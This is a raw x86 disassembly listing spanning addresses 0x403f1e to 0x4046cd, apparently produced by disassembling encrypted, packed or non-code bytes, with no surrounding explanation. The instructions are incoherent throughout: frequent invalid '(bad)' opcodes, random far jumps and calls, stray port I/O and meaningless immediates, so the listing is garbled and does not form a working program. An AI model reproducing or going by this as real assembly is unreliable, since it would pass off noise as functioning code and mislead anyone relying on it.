  403f1e:	or     eax,0x87b46e1c
  403f23:	mov    ch,0xec
  403f25:	ds mov ebx,0xfad03831
  403f2b:	aam    0x54
  403f2d:	mov    fs,WORD PTR [ecx]
  403f2f:	mov    cl,0x1d
  403f31:	add    ebx,eax
  403f33:	mov    eax,ds:0xa319f26f
  403f38:	aaa    
  403f39:	ds ins DWORD PTR es:[edi],dx
  403f3b:	stos   BYTE PTR es:[edi],al
  403f3c:	mul    BYTE PTR ds:0x1eab95b9
  403f42:	ss push ebx
  403f44:	mov    bl,0xe
  403f46:	outs   dx,BYTE PTR ds:[esi]
  403f47:	dec    esp
  403f48:	mov    DWORD PTR [eax],edx
  403f4a:	xchg   ebx,eax
  403f4b:	jb     0x403ee1
  403f4d:	cs (bad) 
  403f4f:	and    DWORD PTR [edx],edi
  403f51:	inc    ebx
  403f52:	sub    ah,cl
  403f54:	sbb    cl,BYTE PTR [ecx]
  403f56:	stos   DWORD PTR es:[edi],eax
  403f57:	add    al,0x25
  403f59:	adc    DWORD PTR [edx+0x7d6463df],edx
  403f5f:	sbb    DWORD PTR [edi],edi
  403f61:	mov    ch,0x78
  403f63:	(bad)  
  403f64:	sbb    WORD PTR [ebx+0x4b863d0b],0x8104
  403f6d:	shr    BYTE PTR [edi+0x46fc9968],0xf5
  403f74:	ins    DWORD PTR es:[edi],dx
  403f75:	xchg   DWORD PTR [esi+0x2b],edx
  403f78:	popf   
  403f79:	push   0x39
  403f7b:	push   ds
  403f7c:	adc    DWORD PTR ds:0xda2b0dfb,edi
  403f82:	mov    dh,0xf4
  403f84:	pushf  
  403f85:	fst    DWORD PTR [eax]
  403f87:	nop
  403f88:	mov    edi,0x44ac31c6
  403f8d:	or     BYTE PTR [ecx-0x504aa9d5],dh
  403f93:	pop    edi
  403f94:	add    BYTE PTR [esi-0x1d],dl
  403f97:	out    dx,al
  403f98:	and    al,0xfc
  403f9a:	jno    0x403f9b
  403f9c:	jle    0x403fe4
  403f9e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403f9f:	stc    
  403fa0:	dec    esi
  403fa1:	push   ebp
  403fa2:	or     BYTE PTR [edi-0x38],bh
  403fa5:	xchg   esi,eax
  403fa6:	or     al,0xb5
  403fa8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403fa9:	push   0xffffffbb
  403fab:	add    BYTE PTR [edx-0x69],0x3
  403faf:	xor    DWORD PTR [ebx-0x2e5f3360],ecx
  403fb5:	ret    
  403fb6:	retf   
  403fb7:	mov    bl,0x34
  403fb9:	cwde   
  403fba:	or     al,BYTE PTR [esi-0x5d]
  403fbd:	push   es
  403fbe:	cmp    eax,0xe7ef0bb7
  403fc3:	xchg   BYTE PTR [edx],cl
  403fc5:	test   eax,0x77713a03
  403fca:	add    DWORD PTR [esi-0x58857047],0x4e
  403fd1:	pop    es
  403fd2:	fistp  QWORD PTR [ecx+0x8]
  403fd5:	dec    edx
  403fd6:	pop    ebx
  403fd7:	ja     0x403fc2
  403fd9:	(bad)  
  403fdb:	push   edx
  403fdc:	push   edi
  403fdd:	or     BYTE PTR [edi+edi*1-0xe],dl
  403fe1:	test   al,al
  403fe3:	pop    ebx
  403fe4:	xor    BYTE PTR [ecx+eiz*1],dl
  403fe7:	jp     0x40403e
  403fe9:	shr    dl,1
  403feb:	mov    cl,0xf5
  403fed:	ffree  st(1)
  403fef:	inc    DWORD PTR [eax+0x1b]
  403ff2:	push   esi
  403ff3:	pop    edx
  403ff4:	mov    ah,0x61
  403ff6:	fsubr  QWORD PTR [edi+0x3ab38e47]
  403ffc:	adc    DWORD PTR [ebx+0xd],edi
  403fff:	inc    esp
  404000:	mov    eax,ds:0xa7609fcb
  404005:	shl    BYTE PTR [edi+ecx*2-0x7164d959],1
  40400c:	aas    
  40400d:	push   cs
  40400e:	cld    
  40400f:	(bad)  
  404011:	mov    ebx,0xc87ce034
  404016:	in     al,dx
  404017:	gs xchg ebp,eax
  404019:	ins    DWORD PTR es:[edi],dx
  40401a:	ds jb  0x40404d
  40401d:	repz (bad) 
  40401f:	pop    ss
  404020:	enter  0xb528,0xfb
  404024:	xchg   ecx,eax
  404025:	shr    DWORD PTR [eax],cl
  404027:	sbb    DWORD PTR [ebp+0x62],ecx
  40402a:	push   ds
  40402b:	jb     0x403ff0
  40402d:	pop    ss
  40402e:	add    eax,0xab768cd2
  404033:	in     eax,0xaa
  404035:	fimul  WORD PTR [ebp+0x60]
  404038:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404039:	mov    WORD PTR [ebp+0x3ff7e826],?
  40403f:	xor    eax,0x4205ac8f
  404044:	dec    ebp
  404045:	stos   DWORD PTR es:[edi],eax
  404046:	retf   0x7b02
  404049:	addr16 mov esi,0x5e6489
  40404f:	scas   al,BYTE PTR es:[edi]
  404050:	pop    esp
  404051:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404052:	mov    edi,0xa62ab547
  404057:	inc    BYTE PTR [ebp+ecx*8-0x75ec5023]
  40405e:	test   al,0x45
  404060:	sub    al,al
  404062:	xlat   BYTE PTR ds:[ebx]
  404063:	cmp    eax,0xfc1f4466
  404068:	out    0xc2,eax
  40406a:	neg    DWORD PTR [ebp+esi*8+0x67]
  40406e:	shl    ch,1
  404070:	and    BYTE PTR [ebp+0x571e6475],al
  404076:	inc    edi
  404077:	rcl    BYTE PTR [ecx+0x26fd8ce3],1
  40407d:	popa   
  40407e:	jb     0x40408e
  404080:	mov    ah,0x48
  404082:	enter  0xfbe4,0x5b
  404086:	mov    cl,0x28
  404088:	fdivr  DWORD PTR [esi]
  40408a:	pop    ebx
  40408b:	add    ah,al
  40408d:	cmc    
  40408e:	out    dx,eax
  40408f:	mov    edx,0x81616e30
  404094:	push   es
  404095:	ins    BYTE PTR es:[edi],dx
  404096:	xchg   edx,eax
  404097:	or     eax,0x17759dc2
  40409c:	and    eax,edi
  40409e:	sbb    cl,0x5
  4040a1:	ins    DWORD PTR es:[edi],dx
  4040a2:	xchg   ecx,eax
  4040a3:	pop    ss
  4040a4:	mov    cl,BYTE PTR [ecx-0x14]
  4040a7:	or     bh,ah
  4040a9:	je     0x4040c1
  4040ab:	xchg   eax,esi
  4040ad:	adc    esp,DWORD PTR [eax+edi*2]
  4040b0:	ret    
  4040b1:	mov    esp,0x4e2b9bc8
  4040b6:	push   0x8a6d669d
  4040bb:	sub    eax,DWORD PTR [eax-0x57]
  4040be:	jns    0x404137
  4040c0:	aad    0x88
  4040c2:	and    DWORD PTR [eax-0x14eaf8cd],0xffffff81
  4040c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4040ca:	bound  eax,QWORD PTR [edi+0x5bd159c0]
  4040d0:	sbb    ebx,DWORD PTR ds:0x7107c05a
  4040d6:	lock icebp 
  4040d8:	push   ecx
  4040d9:	test   al,0xa1
  4040db:	pop    es
  4040dc:	popf   
  4040dd:	repz inc esi
  4040df:	scas   eax,DWORD PTR es:[edi]
  4040e0:	loopne 0x4040b9
  4040e2:	jns    0x4040d4
  4040e4:	popa   
  4040e5:	out    dx,eax
  4040e6:	and    DWORD PTR [esp+ecx*2-0x46991b8f],ecx
  4040ed:	es jae 0x4040fa
  4040f0:	sbb    al,0xfd
  4040f2:	pop    ds
  4040f3:	lea    edi,[ebp-0x34]
  4040f6:	adc    eax,0x8c174251
  4040fb:	adc    esi,DWORD PTR [ebx-0x6c9340cd]
  404101:	add    BYTE PTR [esi],0x58
  404104:	lds    esi,FWORD PTR [ebp+0x506edbe2]
  40410a:	xlat   BYTE PTR ds:[ebx]
  40410b:	hlt    
  40410c:	icebp  
  40410d:	jmp    FWORD PTR [esi]
  40410f:	sar    BYTE PTR [edx-0x6e20d284],cl
  404115:	dec    eax
  404116:	mov    eax,ds:0x3738c58d
  40411b:	cmp    BYTE PTR [esp+ebx*2],bh
  40411e:	adc    ebx,DWORD PTR [esi+eax*4]
  404121:	aaa    
  404122:	inc    esp
  404123:	push   esi
  404124:	and    ebx,DWORD PTR [eax+0x27]
  404127:	push   0x33
  404129:	xchg   esp,eax
  40412a:	fmul   DWORD PTR [ebx-0x7a]
  40412d:	out    0x68,eax
  40412f:	inc    edx
  404130:	cmp    al,0xbb
  404132:	dec    edi
  404133:	hlt    
  404134:	(bad)  
  404135:	retf   0xdd67
  404138:	jle    0x404157
  40413a:	jmp    0x244e:0xcb380cac
  404141:	cmp    esi,DWORD PTR [ecx-0x48862949]
  404147:	jnp    0x4041a6
  404149:	out    dx,eax
  40414a:	fld    TBYTE PTR [ebx-0x641ce4e]
  404150:	in     eax,dx
  404151:	aad    0xc
  404153:	mov    edi,0xf5f3010b
  404158:	sub    ah,BYTE PTR ds:0x8fa87772
  40415e:	call   0xcb0a:0x5098c011
  404165:	mov    bh,0xe8
  404167:	gs (bad) 
  404169:	aas    
  40416a:	mov    edx,DWORD PTR [edi]
  40416c:	mov    dh,0xd3
  40416e:	imul   ebx,DWORD PTR [edi+esi*2+0x5dfad9e8],0xfffffff4
  404176:	xchg   esp,eax
  404177:	add    ch,BYTE PTR [ecx]
  404179:	les    edi,FWORD PTR [eax-0x60]
  40417c:	fidiv  WORD PTR [ecx+0x4c]
  40417f:	ds cli 
  404181:	pop    ss
  404182:	je     0x404166
  404184:	(bad)  [ecx+0x2]
  404187:	or     ebx,esp
  404189:	fldcw  WORD PTR [ebx-0x6a]
  40418c:	in     eax,dx
  40418d:	pop    edx
  40418e:	mov    dh,0x50
  404190:	sbb    esi,ecx
  404192:	imul   ebx,DWORD PTR [ecx-0x7d],0x47e19ce0
  404199:	sub    DWORD PTR [edx+0x76],ebp
  40419c:	push   ebx
  40419d:	pop    edi
  40419e:	xchg   edi,eax
  40419f:	inc    ebp
  4041a0:	clc    
  4041a1:	gs dec ebx
  4041a3:	fcomi  st,st(6)
  4041a5:	retf   0xa9ce
  4041a8:	mov    esp,0xef088751
  4041ad:	adc    BYTE PTR [eax],ah
  4041af:	cdq    
  4041b0:	sbb    eax,0xd14900ce
  4041b5:	in     eax,dx
  4041b6:	cmp    bl,BYTE PTR [ebx-0x7a]
  4041b9:	push   edi
  4041ba:	and    al,0xb6
  4041bc:	das    
  4041bd:	ret    
  4041be:	adc    BYTE PTR [edx-0x5b6a097d],cl
  4041c4:	into   
  4041c5:	outs   dx,BYTE PTR ds:[esi]
  4041c6:	leave  
  4041c7:	mov    edx,0x71941259
  4041cc:	fwait
  4041cd:	(bad)  
  4041ce:	adc    eax,0x3e9e2d31
  4041d3:	jmp    0x13a31219
  4041d8:	out    dx,al
  4041d9:	test   al,0xd3
  4041db:	fwait
  4041dc:	stos   DWORD PTR es:[edi],eax
  4041dd:	sub    BYTE PTR [edx-0x3071646d],ch
  4041e3:	dec    ebp
  4041e4:	loope  0x40418e
  4041e6:	add    ch,BYTE PTR [edx+0x48565c7e]
  4041ec:	xor    dh,BYTE PTR [ebx+0x43]
  4041ef:	and    al,0x53
  4041f1:	lea    ebp,[ebp+0x12]
  4041f4:	inc    edi
  4041f5:	mov    esi,0x99511515
  4041fa:	sbb    eax,0xb611a88a
  4041ff:	jge    0x40427a
  404201:	test   al,0xc4
  404203:	in     al,dx
  404204:	jl     0x40427c
  404206:	int3   
  404207:	sub    DWORD PTR [edx],ebx
  404209:	nop
  40420a:	mov    bl,0xb6
  40420c:	sbb    BYTE PTR [edi+0x5d1a2c53],0xbc
  404213:	loope  0x404262
  404215:	pop    eax
  404216:	mov    al,0xf3
  404218:	bound  ebx,QWORD PTR [edx]
  40421a:	or     eax,0xb930be09
  40421f:	jmp    0xe1493c2c
  404224:	(bad)  [ebp-0x3d5ef5d2]
  40422a:	inc    ebx
  40422b:	sub    ebp,ebx
  40422d:	pop    ecx
  40422e:	pop    es
  40422f:	fwait
  404230:	adc    BYTE PTR [esi],0x88
  404233:	rcr    DWORD PTR [ebx-0x7e8a785e],0xbf
  40423a:	test   DWORD PTR [edx],0xb2593331
  404240:	add    al,0x9f
  404242:	dec    edi
  404243:	mul    BYTE PTR [ebx-0x2575be88]
  404249:	int3   
  40424a:	inc    esi
  40424b:	pop    edx
  40424c:	fldz   
  40424e:	push   ecx
  40424f:	(bad)  
  404251:	jmp    0xcc62:0xca69153c
  404258:	mov    ds:0x1c912b0c,al
  40425d:	mov    bl,0x8a
  40425f:	mov    BYTE PTR [edi-0xd],ch
  404262:	rcl    esi,0x70
  404265:	and    esp,edi
  404267:	fsubr  QWORD PTR [esi+ecx*8]
  40426a:	sbb    ah,dl
  40426c:	dec    esi
  40426d:	shl    DWORD PTR [ecx-0x2],0x36
  404271:	jecxz  0x4042a4
  404273:	jb     0x40426d
  404275:	adc    eax,DWORD PTR [ecx+0x38]
  404278:	retf   
  404279:	(bad)  
  40427a:	enter  0x6f4e,0x54
  40427e:	jg     0x40424b
  404280:	xchg   ecx,eax
  404281:	iret   
  404282:	adc    eax,0x3b4cd8f2
  404287:	jo     0x4042bc
  404289:	dec    esi
  40428b:	(bad)  
  40428c:	or     ah,BYTE PTR [edx-0x372cdfef]
  404292:	mov    dl,0x67
  404294:	mov    bh,BYTE PTR ds:0xd8b45c3e
  40429a:	into   
  40429b:	xchg   edi,eax
  40429c:	cmp    al,0x43
  40429e:	or     edi,DWORD PTR [ebx+0x3918096]
  4042a4:	mov    edx,ebx
  4042a6:	xchg   ebx,eax
  4042a7:	sub    eax,0x480b8bad
  4042ac:	inc    ecx
  4042ad:	xchg   ah,cl
  4042af:	in     al,0xc8
  4042b1:	test   BYTE PTR [edx+edi*4],0x29
  4042b5:	rol    DWORD PTR [esi+0x56],1
  4042b8:	ror    DWORD PTR [ebp-0x2],cl
  4042bb:	and    ch,dh
  4042bd:	jmp    0x404246
  4042bf:	dec    ebp
  4042c0:	rcl    ebp,cl
  4042c2:	retf   
  4042c3:	call   0x1b8c:0x3098cb8
  4042ca:	iret   
  4042cb:	ins    BYTE PTR es:[edi],dx
  4042cc:	push   ebx
  4042cd:	mov    ebp,DWORD PTR [esi-0x341d043a]
  4042d3:	jb     0x404256
  4042d5:	or     DWORD PTR [ecx+0x55],ecx
  4042d8:	xchg   edi,eax
  4042d9:	push   es
  4042da:	cs or  al,bl
  4042dd:	jnp    0x404337
  4042df:	dec    ebp
  4042e0:	dec    ecx
  4042e1:	fsubr  st,st(3)
  4042e3:	in     eax,0x8f
  4042e5:	add    BYTE PTR ds:0xf391f7ce,0x6a
  4042ec:	clc    
  4042ed:	sub    edx,DWORD PTR [ecx-0x41]
  4042f0:	ds push ecx
  4042f2:	xor    DWORD PTR ds:0x1163fded,edx
  4042f8:	sub    al,0xde
  4042fa:	cwde   
  4042fb:	add    eax,0x2415d8e1
  404300:	lods   eax,DWORD PTR ds:[esi]
  404301:	mov    ch,0xd3
  404303:	aaa    
  404304:	iret   
  404305:	div    BYTE PTR [eax-0x13]
  404308:	sbb    ecx,DWORD PTR [eax]
  40430a:	stc    
  40430b:	and    eax,0xc3418de3
  404310:	pop    ecx
  404311:	mov    ebp,0x510334a2
  404316:	sub    DWORD PTR [ebx-0x7a],ecx
  404319:	lods   al,BYTE PTR ds:[esi]
  40431a:	outs   dx,BYTE PTR ds:[esi]
  40431b:	loopne 0x4042c8
  40431d:	sub    al,0x53
  40431f:	and    DWORD PTR [ecx+0x7c],eax
  404322:	ins    BYTE PTR es:[edi],dx
  404323:	mov    BYTE PTR [ebx-0x68],ah
  404326:	jns    0x4042ba
  404328:	add    ebx,DWORD PTR [esi+0x309a91c]
  40432e:	xlat   BYTE PTR ds:[ebx]
  40432f:	cmp    BYTE PTR [ebp-0x58],bh
  404332:	push   esp
  404333:	cld    
  404334:	inc    ecx
  404335:	(bad)  
  404336:	pop    ebx
  404337:	push   esp
  404338:	call   0x7c34:0x1b4e6435
  40433f:	jmp    0x82e2a6ab
  404344:	or     DWORD PTR [esi],ebp
  404346:	pop    edx
  404347:	test   DWORD PTR [ecx+0x70],esp
  40434a:	scas   al,BYTE PTR es:[edi]
  40434b:	mov    edx,0xbfb4f9a2
  404350:	stos   BYTE PTR es:[edi],al
  404351:	popa   
  404352:	jmp    0xca945a4a
  404357:	pop    ss
  404358:	adc    BYTE PTR [esi+esi*8-0x42],ah
  40435c:	xor    ch,ah
  40435e:	xor    al,0xea
  404360:	mov    al,ah
  404362:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404363:	add    al,0x60
  404365:	sub    cl,BYTE PTR [ebp+edi*4-0xe]
  404369:	outs   dx,DWORD PTR ds:[esi]
  40436a:	inc    eax
  40436b:	inc    ebp
  40436c:	das    
  40436d:	xchg   esp,eax
  40436e:	(bad)  
  40436f:	imul   DWORD PTR [esi-0x3c]
  404372:	sahf   
  404373:	mov    ebx,0xedb0e3a8
  404378:	out    dx,al
  404379:	sub    bh,dl
  40437b:	jmp    0x40436d
  40437d:	fisubr DWORD PTR [ebx+0x2a]
  404380:	jnp    0x40436f
  404382:	js     0x404389
  404384:	jmp    0x404310
  404386:	ds or  ebx,esp
  404389:	popa   
  40438a:	mov    ds:0xb7600f2e,al
  40438f:	imul   esp,DWORD PTR [ebx-0x15],0x555c1169
  404396:	xchg   ebx,eax
  404397:	(bad)  
  404399:	dec    esi
  40439a:	inc    esi
  40439b:	or     edx,0x697c559
  4043a1:	xchg   edi,eax
  4043a2:	ret    0x2eef
  4043a5:	jmp    0x4043eb
  4043a7:	pusha  
  4043a8:	inc    ebp
  4043a9:	les    ebp,FWORD PTR [ebp-0x3e54efb3]
  4043af:	imul   edx,DWORD PTR [ecx-0x6],0xffffffb0
  4043b3:	jno    0x4043a1
  4043b5:	sbb    dh,BYTE PTR [ebx-0x4e]
  4043b8:	add    BYTE PTR [esi+0x67ab851c],al
  4043be:	add    eax,0x1a417dd5
  4043c3:	lock xchg edi,eax
  4043c5:	mov    al,ds:0x480a2ca5
  4043ca:	jl     0x404438
  4043cc:	pushf  
  4043cd:	daa    
  4043ce:	dec    edi
  4043cf:	xchg   bh,al
  4043d1:	ret    0x759a
  4043d4:	push   ds
  4043d5:	(bad)  
  4043d7:	push   ss
  4043d8:	hlt    
  4043d9:	inc    esi
  4043da:	jmp    0x91e4:0x4380e8bb
  4043e1:	jnp    0x404445
  4043e3:	inc    edx
  4043e4:	xor    BYTE PTR [ebp+0x60],cl
  4043e7:	xchg   ebx,eax
  4043e8:	mov    al,ds:0x311c437b
  4043ed:	push   0xffffffe1
  4043ef:	and    edi,ebp
  4043f1:	jp     0x4043ed
  4043f3:	aam    0x46
  4043f5:	sub    eax,0x26112802
  4043fa:	xchg   ecx,eax
  4043fb:	mov    ch,0x54
  4043fd:	dec    esp
  4043fe:	jg     0x404399
  404400:	mov    ebp,0x38206812
  404405:	(bad)  
  404406:	ds stos DWORD PTR es:[edi],eax
  404408:	mov    bl,0xda
  40440a:	enter  0x6342,0x1c
  40440e:	popf   
  40440f:	adc    BYTE PTR [edi+0x16a2793e],cl
  404415:	popa   
  404416:	lds    ebx,FWORD PTR [esi+ecx*1-0x55]
  40441a:	test   DWORD PTR [eax+0x7edeb13f],ebp
  404420:	imul   eax,DWORD PTR [ebx+0x7a],0xd222b0
  404427:	push   ebp
  404428:	xor    DWORD PTR [edi+0x0],0x55
  40442c:	mov    ecx,DWORD PTR [eax-0x1]
  40442f:	dec    eax
  404430:	pusha  
  404431:	inc    eax
  404432:	(bad)  
  404434:	popf   
  404435:	je     0x40444b
  404437:	jns    0x404401
  404439:	test   BYTE PTR [eax],0xc4
  40443c:	fisubr DWORD PTR ds:0x4e896741
  404442:	je     0x40440f
  404444:	cmp    BYTE PTR [eax],ah
  404446:	in     eax,dx
  404447:	or     BYTE PTR [edi+0x70ccd1bb],0x1d
  40444e:	xchg   ebx,eax
  40444f:	xchg   ebp,eax
  404450:	stos   DWORD PTR es:[edi],eax
  404451:	sbb    eax,0x47dbf579
  404456:	rol    BYTE PTR [ebp+0x4b],0x14
  40445a:	dec    esi
  40445b:	ds fwait
  40445d:	sbb    al,0x42
  40445f:	in     eax,dx
  404460:	push   cs
  404461:	lock cs stos DWORD PTR es:[edi],eax
  404464:	mov    edi,0x7b5ce748
  404469:	xchg   ecx,eax
  40446a:	push   0x12afe62e
  40446f:	add    ch,BYTE PTR [esi-0x2e]
  404472:	or     al,0x7f
  404474:	icebp  
  404475:	inc    ecx
  404476:	in     eax,0x6c
  404478:	pop    esp
  404479:	cmp    al,0x2c
  40447b:	xchg   edi,eax
  40447c:	nop
  40447d:	push   cs
  40447e:	inc    esp
  40447f:	pop    eax
  404480:	(bad)  
  404481:	imul   DWORD PTR [edi]
  404483:	out    0x8d,al
  404485:	addr16 push ecx
  404487:	sbb    DWORD PTR [edx],ecx
  404489:	dec    edi
  40448a:	in     eax,dx
  40448b:	mov    al,ds:0xa5ec3e86
  404490:	fisub  DWORD PTR [esi]
  404492:	xchg   esp,esp
  404494:	lea    ebp,[edi+eiz*2+0xa]
  404498:	cmp    cl,ah
  40449a:	fcomp  QWORD PTR [edi-0x637aef8f]
  4044a0:	mov    bl,0x27
  4044a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4044a3:	add    al,0x99
  4044a5:	adc    al,0x46
  4044a7:	(bad)  
  4044a8:	pop    esp
  4044a9:	je     0x404494
  4044ab:	je     0x40451e
  4044ad:	mov    ch,0x6b
  4044af:	or     eax,0x75aa969c
  4044b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4044b5:	scas   eax,DWORD PTR es:[edi]
  4044b6:	(bad)  
  4044b7:	loop   0x40449c
  4044b9:	inc    edx
  4044ba:	push   ebp
  4044bb:	jg     0x40448d
  4044bd:	mov    bh,0x56
  4044bf:	mov    bl,0xe1
  4044c1:	imul   edx,edx,0xffffff8c
  4044c4:	push   0xffffffb8
  4044c6:	dec    ecx
  4044c7:	daa    
  4044c8:	aaa    
  4044c9:	fmul   DWORD PTR [edi+0x40]
  4044cc:	daa    
  4044cd:	xor    eax,0xe1a583c0
  4044d2:	mov    ecx,0xed926d3d
  4044d7:	(bad)  
  4044d8:	shl    dh,1
  4044da:	arpl   WORD PTR [ebp-0x4b],si
  4044dd:	fld    TBYTE PTR [eax-0x7010df0c]
  4044e3:	aaa    
  4044e4:	jecxz  0x40451f
  4044e6:	mov    eax,0x744a363
  4044eb:	mov    ds:0x49b51690,al
  4044f0:	mov    dl,0x82
  4044f2:	out    dx,al
  4044f3:	dec    esp
  4044f4:	mov    eax,ds:0x5f590210
  4044f9:	pop    edi
  4044fa:	dec    eax
  4044fb:	jb     0x404518
  4044fd:	and    al,0x55
  4044ff:	pop    esp
  404500:	jmp    0x1638:0x6582580
  404507:	and    esp,DWORD PTR [eax-0x4f88c778]
  40450d:	mov    DWORD PTR [ebp+edx*8+0x1f451e42],eax
  404514:	aaa    
  404515:	iret   
  404516:	es int 0xf0
  404519:	js     0x4044cd
  40451b:	pop    edi
  40451c:	cmp    BYTE PTR [ebx-0x7c],al
  40451f:	xchg   ebx,eax
  404520:	popa   
  404521:	pusha  
  404522:	mov    edi,DWORD PTR [ebp+ebx*4-0x12]
  404526:	scas   al,BYTE PTR es:[edi]
  404527:	mov    edi,0xf46ad017
  40452c:	sbb    BYTE PTR [esi+eax*2+0x3b],al
  404530:	fidiv  DWORD PTR ds:0xd7047d97
  404536:	push   esp
  404537:	mov    cl,BYTE PTR [ecx+0x11]
  40453a:	outs   dx,BYTE PTR ds:[esi]
  40453b:	ds sub cl,ah
  40453e:	adc    BYTE PTR [ebx-0xf],al
  404541:	lock mov ah,0x69
  404544:	cld    
  404545:	into   
  404546:	add    cl,BYTE PTR [ebp-0x7833b9a9]
  40454c:	fdiv   st,st(2)
  40454e:	hlt    
  40454f:	loop   0x404524
  404551:	mov    eax,0xadaf353b
  404556:	sub    BYTE PTR [ecx],cl
  404558:	aas    
  404559:	pop    edi
  40455a:	dec    dx
  40455c:	aam    0x81
  40455e:	imul   DWORD PTR [edi+0x1722b117]
  404564:	(bad)  
  404565:	lahf   
  404566:	xor    BYTE PTR [ebx-0x4f],bl
  404569:	enter  0xc824,0xc5
  40456d:	jg     0x404547
  40456f:	inc    edx
  404570:	(bad)  
  404571:	js     0x4045e5
  404573:	push   ecx
  404574:	mov    WORD PTR [eax],?
  404576:	inc    eax
  404577:	dec    esp
  404578:	bound  ebx,QWORD PTR [ebx-0x70d1972d]
  40457e:	in     eax,dx
  40457f:	inc    esi
  404580:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404581:	je     0x404577
  404583:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404584:	into   
  404585:	mov    DWORD PTR [ebp-0x697089aa],ebp
  40458b:	add    BYTE PTR ds:0x80110662,cl
  404591:	bound  ebx,QWORD PTR [ebp-0x1f6fc2d]
  404597:	sti    
  404598:	fisubr WORD PTR [edx-0x227eb1fa]
  40459e:	inc    ecx
  40459f:	sbb    cl,BYTE PTR [ebx]
  4045a1:	out    dx,al
  4045a2:	mov    dh,0x9f
  4045a4:	xchg   edi,eax
  4045a5:	sti    
  4045a6:	pop    ecx
  4045a7:	mov    ?,WORD PTR [edx+0x22bb9bf3]
  4045ad:	fst    DWORD PTR [eax+0x57b6676d]
  4045b3:	mov    WORD PTR [esi+0x3ac144e5],ss
  4045b9:	sbb    BYTE PTR [ecx+0x60],al
  4045bc:	mov    dl,BYTE PTR [edx+0x2e8ac4ec]
  4045c2:	jl     0x4045b2
  4045c4:	fsubr  DWORD PTR [ecx]
  4045c6:	add    DWORD PTR [eax],0x19
  4045c9:	mov    bh,0xed
  4045cb:	rol    DWORD PTR [esi+0xa],cl
  4045ce:	and    DWORD PTR [esi+ebx*4+0x38],esp
  4045d2:	inc    edx
  4045d3:	(bad)  
  4045d4:	dec    ebp
  4045d5:	jecxz  0x404624
  4045d7:	mov    al,ds:0xc718e0c7
  4045dc:	mov    eax,ds:0xacb12b05
  4045e1:	xchg   esi,eax
  4045e2:	mov    bl,BYTE PTR [esi-0x6c143a7c]
  4045e8:	in     al,0x9b
  4045ea:	xor    BYTE PTR [esi-0x5e98ee2b],bl
  4045f0:	out    dx,eax
  4045f1:	add    ch,BYTE PTR [ebp-0x288c4193]
  4045f7:	jne    0x4045d1
  4045f9:	ficomp DWORD PTR [eax+0x4e0fc525]
  4045ff:	pusha  
  404600:	sbb    eax,0x109d5cda
  404605:	mov    al,ds:0xf863e03a
  40460a:	scas   al,BYTE PTR es:[edi]
  40460b:	imul   esi,DWORD PTR [ecx-0x1a],0x9cd28858
  404612:	ins    BYTE PTR es:[edi],dx
  404613:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404614:	std    
  404615:	test   DWORD PTR [esi+0xe],edi
  404618:	hlt    
  404619:	bound  eax,QWORD PTR [ebx+0x22]
  40461c:	push   esi
  40461d:	fisubr WORD PTR [ecx]
  40461f:	mov    ah,0xca
  404621:	xchg   ebx,eax
  404622:	add    ch,BYTE PTR [eax+0x73]
  404625:	cmc    
  404626:	lds    ebx,FWORD PTR [eax]
  404628:	das    
  404629:	push   esi
  40462a:	sbb    BYTE PTR [ecx+ebx*4],dl
  40462d:	xor    BYTE PTR [ecx],al
  40462f:	pop    edi
  404630:	loopne 0x4046ac
  404632:	push   ds
  404633:	or     cl,BYTE PTR [ebx-0xa]
  404636:	sbb    eax,0x4f5ac622
  40463b:	mov    ds:0xac0849f,al
  404640:	fmul   QWORD PTR [eax-0x49]
  404643:	test   al,0x7
  404645:	daa    
  404646:	xlat   BYTE PTR ds:[ebx]
  404647:	stos   BYTE PTR es:[edi],al
  404648:	repnz xchg edi,eax
  40464a:	adc    eax,0xf0e65e32
  40464f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404650:	imul   esi,DWORD PTR [esp+ecx*4-0x6014874c],0xa3c46b13
  40465b:	push   esp
  40465c:	or     edi,DWORD PTR [ecx]
  40465e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40465f:	in     eax,dx
  404660:	test   BYTE PTR [ebx],ah
  404662:	pop    ds
  404663:	into   
  404664:	push   esi
  404665:	retf   
  404666:	mov    bh,BYTE PTR [ebp-0x14479d9a]
  40466c:	dec    edi
  40466d:	in     eax,0xed
  40466f:	(bad)  
  404670:	xchg   edi,eax
  404671:	pop    es
  404672:	sub    edx,DWORD PTR [edx+0x1e]
  404675:	bound  eax,QWORD PTR [edx]
  404677:	sub    BYTE PTR [esi-0x7d],bh
  40467a:	(bad)  
  40467b:	or     DWORD PTR [eax-0x64bfc8ba],ebp
  404681:	xor    al,0xed
  404683:	clc    
  404684:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404685:	or     BYTE PTR [edx+eax*4+0x2b30bf7d],ch
  40468c:	into   
  40468d:	mov    dl,0xe
  40468f:	fldcw  WORD PTR [eax+0x1]
  404692:	aas    
  404693:	xchg   esp,eax
  404694:	pop    edx
  404695:	mov    ecx,0x2742a8ed
  40469a:	adc    al,0xc1
  40469c:	ret    
  40469d:	loop   0x4046c3
  40469f:	in     al,0x1b
  4046a1:	(bad)  
  4046a2:	in     al,0x44
  4046a4:	add    BYTE PTR [ebx-0x48],ah
  4046a7:	ret    0x2f76
  4046aa:	xchg   ecx,eax
  4046ab:	daa    
  4046ac:	and    ah,dl
  4046ae:	data16 fdecstp 
  4046b1:	stos   BYTE PTR es:[edi],al
  4046b2:	adc    eax,0xffffffcc
  4046b5:	mov    eax,0xe01227d6
  4046ba:	jae    0x4046c9
  4046bc:	xor    DWORD PTR [edx],0x5b702d7c
  4046c2:	cdq    
  4046c3:	adc    BYTE PTR [edi+0x21],bl
  4046c6:	dec    edi
  4046c7:	stos   BYTE PTR es:[edi],al
  4046c8:	mov    edx,0x65d0c18e
  4046cd:	mov    esp,0x6d2c8c54
